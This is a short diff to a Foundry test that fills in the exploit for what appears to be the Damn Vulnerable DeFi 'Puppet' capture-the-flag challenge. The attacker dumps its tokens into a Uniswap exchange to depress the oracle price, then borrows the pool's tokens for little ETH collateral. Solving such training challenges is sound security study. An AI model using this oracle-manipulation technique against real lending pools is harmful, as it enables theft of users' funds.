@@ -97,13 +97,11 @@ contract Puppet is Test {
     }
 
     function testExploit() public {
-        /**
-         * EXPLOIT START *
-         */
-
-        /**
-         * EXPLOIT END *
-         */
+        vm.startPrank(attacker);
+        dvt.approve(address(uniswapExchange),1000e18);
+        uniswapExchange.tokenToEthSwapInput(dvt.balanceOf(attacker), 100, DEADLINE);
+        puppetPool.borrow{value:attacker.balance}(100000e18);
+        vm.stopPrank();
         validation();
         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
     }
